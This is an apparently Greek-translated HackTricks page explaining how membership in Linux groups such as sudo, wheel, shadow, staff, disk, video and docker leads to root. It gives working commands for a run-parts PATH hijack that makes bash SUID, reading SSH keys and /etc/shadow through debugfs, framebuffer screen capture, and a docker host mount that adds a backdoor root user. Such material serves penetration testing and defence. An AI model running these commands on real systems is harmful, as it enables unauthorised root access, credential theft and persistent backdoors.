# Ενδιαφέρουσες Ομάδες - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Groups

### **PE - Method 1**

**Κάποιες φορές**, **εκ προεπιλογής (ή επειδή κάποιο λογισμικό το χρειάζεται)** μέσα στο αρχείο **/etc/sudoers** μπορείτε να βρείτε κάποιες από τις ακόλουθες γραμμές:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Αυτό σημαίνει ότι **οποιοσδήποτε χρήστης που ανήκει στην ομάδα sudo ή admin μπορεί να εκτελέσει οτιδήποτε ως sudo**.

Εάν αυτό ισχύει, για να **γίνετε root μπορείτε απλά να εκτελέσετε**:
```
sudo su
```
### PE - Μέθοδος 2

Βρείτε όλα τα suid binaries και ελέγξτε αν υπάρχει το binary **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Αν διαπιστώσετε ότι το binary **pkexec is a SUID binary** και αν ανήκετε στο **sudo** ή στο **admin**, πιθανότατα θα μπορείτε να εκτελείτε binaries ως sudo χρησιμοποιώντας `pkexec`.\
Αυτό συμβαίνει επειδή συνήθως αυτές είναι οι ομάδες που ορίζονται στην **polkit policy**. Αυτή η πολιτική ουσιαστικά καθορίζει ποιες ομάδες μπορούν να χρησιμοποιήσουν `pkexec`. Ελέγξτε το με:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Εκεί θα βρείτε ποιες ομάδες επιτρέπεται να εκτελούν το **pkexec** και **εξ ορισμού** σε ορισμένες διανομές Linux εμφανίζονται οι ομάδες **sudo** και **admin**.

Για να **γίνετε root μπορείτε να εκτελέσετε**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Αν προσπαθήσεις να εκτελέσεις **pkexec** και λάβεις αυτό το **σφάλμα**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Δεν οφείλεται στο ότι δεν έχετε δικαιώματα αλλά στο ότι δεν είστε συνδεδεμένοι σε περιβάλλον με GUI**. Και υπάρχει παράκαμψη για αυτό το πρόβλημα εδώ: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Χρειάζεστε **2 different ssh sessions**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Ομάδα wheel

**Μερικές φορές**, **από προεπιλογή** μέσα στο **/etc/sudoers** αρχείο μπορείτε να βρείτε αυτή τη γραμμή:
```
%wheel	ALL=(ALL:ALL) ALL
```
Αυτό σημαίνει ότι **οποιοσδήποτε χρήστης που ανήκει στην ομάδα wheel μπορεί να εκτελέσει οτιδήποτε ως sudo**.

Εάν ισχύει αυτό, για να **γίνεις root μπορείς απλώς να εκτελέσεις**:
```
sudo su
```
## Ομάδα shadow

Χρήστες της **ομάδας shadow** μπορούν να **διαβάσουν** το αρχείο **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, read the file and try to **crack some hashes**.

Quick lock-state nuance when triaging hashes:
- Entries with `!` or `*` are generally non-interactive for password logins.
- `!hash` usually means a password was set and then locked.
- `*` usually means no valid password hash was ever set.
This is useful for account classification even when direct login is blocked.

## Staff Group

**staff**: Επιτρέπει στους χρήστες να προσθέτουν τοπικές τροποποιήσεις στο σύστημα (`/usr/local`) χωρίς να χρειάζονται δικαιώματα root (σημείωση ότι τα εκτελέσιμα στο `/usr/local/bin` είναι στη μεταβλητή PATH κάθε χρήστη, και μπορεί να αντικαταστήσουν τα εκτελέσιμα στο `/bin` και `/usr/bin` με το ίδιο όνομα). Συγκρίνεται με την ομάδα "adm", που σχετίζεται περισσότερο με monitoring/security. [\[source\]](https://wiki.debian.org/SystemGroups)

In debian distributions, `$PATH` variable show that `/usr/local/` will be run as the highest priority, whether you are a privileged user or not.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Αν μπορούμε να hijack μερικά προγράμματα στο `/usr/local`, μπορούμε εύκολα να αποκτήσουμε root.

Το hijack του προγράμματος `run-parts` είναι ένας εύκολος τρόπος για να αποκτήσει κανείς root, επειδή τα περισσότερα προγράμματα θα εκτελέσουν ένα `run-parts` (π.χ. crontab, κατά την είσοδο μέσω ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
ή όταν συνδεθεί μια νέα ssh συνεδρία.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

Αυτό το προνόμιο είναι σχεδόν **ισοδύναμο με root access** καθώς μπορείτε να έχετε πρόσβαση σε όλα τα δεδομένα μέσα στη μηχανή.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Σημειώστε ότι χρησιμοποιώντας το debugfs μπορείτε επίσης να **γράψετε αρχεία**. Για παράδειγμα, για να αντιγράψετε το `/tmp/asd1.txt` στο `/tmp/asd2.txt` μπορείτε να κάνετε:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Ωστόσο, εάν προσπαθήσετε να **γράψετε αρχεία που ανήκουν στον root** (όπως `/etc/shadow` ή `/etc/passwd`) θα λάβετε ένα σφάλμα "**Permission denied**".

## Ομάδα βίντεο

Με την εντολή `w` μπορείτε να βρείτε **ποιος είναι συνδεδεμένος στο σύστημα** και θα εμφανίσει μια έξοδο όπως η παρακάτω:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Το **tty1** σημαίνει ότι ο χρήστης **yossi είναι φυσικά συνδεδεμένος** σε ένα τερματικό στη μηχανή.

Η **video group** έχει πρόσβαση για προβολή της εξόδου της οθόνης. Βασικά μπορείτε να παρατηρήσετε τις οθόνες. Για να το κάνετε αυτό πρέπει να **αποκτήσετε την τρέχουσα εικόνα της οθόνης** ως raw δεδομένα και να βρείτε την ανάλυση που χρησιμοποιεί η οθόνη. Τα δεδομένα της οθόνης μπορούν να αποθηκευτούν στο `/dev/fb0` και μπορείτε να βρείτε την ανάλυση αυτής της οθόνης στο `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Για να ανοίξετε την **raw image** μπορείτε να χρησιμοποιήσετε το **GIMP** — επιλέξτε το αρχείο **`screen.raw`** και ως τύπο αρχείου επιλέξτε **Raw image data**:

![](<../../../images/image (463).png>)

Στη συνέχεια τροποποιήστε το Width και το Height στις τιμές που χρησιμοποιεί η οθόνη και δοκιμάστε διαφορετικά Image Types (επιλέξτε αυτό που εμφανίζει καλύτερα την οθόνη):

![](<../../../images/image (317).png>)

## Ομάδα root

Φαίνεται ότι από προεπιλογή τα **μέλη της ομάδας root** μπορεί να έχουν πρόσβαση να **τροποποιήσουν** κάποια αρχεία ρυθμίσεων service ή κάποια αρχεία libraries ή **άλλα ενδιαφέροντα πράγματα** που θα μπορούσαν να χρησιμοποιηθούν για αύξηση προνομίων...

**Ελέγξτε ποια αρχεία μπορούν να τροποποιήσουν τα μέλη της ομάδας root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Μπορείτε να **mount το root filesystem της host μηχανής σε ένα volume ενός instance**, έτσι όταν το instance ξεκινάει, φορτώνει αμέσως ένα `chroot` σε αυτό το volume. Αυτό ουσιαστικά σας δίνει root στη μηχανή.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Τέλος, αν δεν σας αρέσει κάποια από τις προηγούμενες προτάσεις, ή δεν λειτουργούν για κάποιο λόγο (docker api firewall?) μπορείτε πάντα να δοκιμάσετε να **run a privileged container and escape from it** όπως εξηγείται εδώ:


{{#ref}}
../container-security/
{{#endref}}

Αν έχετε δικαιώματα εγγραφής στο docker socket διαβάστε [**this post about how to escalate privileges abusing the docker socket**](../index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Ομάδα lxc/lxd


{{#ref}}
./
{{#endref}}

## Ομάδα adm

Συνήθως τα **μέλη** της ομάδας **`adm`** έχουν δικαιώματα να **read log** αρχεία που βρίσκονται στο _/var/log/_.\
Επομένως, αν έχετε παραβιάσει έναν χρήστη αυτής της ομάδας, θα πρέπει οπωσδήποτε να ρίξετε μια **look to the logs**.

## Ομάδες Backup / Operator / lp / Mail

Αυτές οι ομάδες είναι συχνά vectors τύπου **credential-discovery** αντί για απευθείας root vectors:
- **backup**: μπορεί να αποκαλύψει archives με configs, keys, DB dumps ή tokens.
- **operator**: platform-specific operational access που μπορεί να leak ευαίσθητα runtime δεδομένα.
- **lp**: print queues/spools μπορούν να περιέχουν document contents.
- **mail**: mail spools μπορούν να αποκαλύψουν reset links, OTPs και internal credentials.

Θεωρήστε τη συμμετοχή εδώ ως εύρημα υψηλής αξίας για data exposure και pivot μέσω password/token reuse.

## Ομάδα auth

Στο OpenBSD η ομάδα **auth** συνήθως μπορεί να γράψει στους φακέλους _**/etc/skey**_ και _**/var/db/yubikey**_ αν χρησιμοποιούνται.\
Αυτά τα δικαιώματα μπορούν να καταχραστούν με το παρακάτω exploit για να **escalate privileges** σε root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
